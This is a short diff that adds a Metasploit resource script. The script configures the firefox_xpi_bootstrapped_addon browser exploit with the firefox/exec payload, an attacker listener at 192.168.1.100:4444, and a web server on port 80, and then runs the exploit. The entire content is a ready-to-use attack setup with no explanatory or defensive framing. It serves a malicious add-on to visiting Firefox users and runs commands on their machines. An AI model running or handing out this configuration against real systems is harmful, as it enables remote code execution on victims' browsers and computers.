@@ -1,0 +1,7 @@
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon
+set SRVPORT 80
+set LHOST 192.168.1.100
+set LPORT 4444
+set payload firefox/exec
+set URIPATH /
+exploit
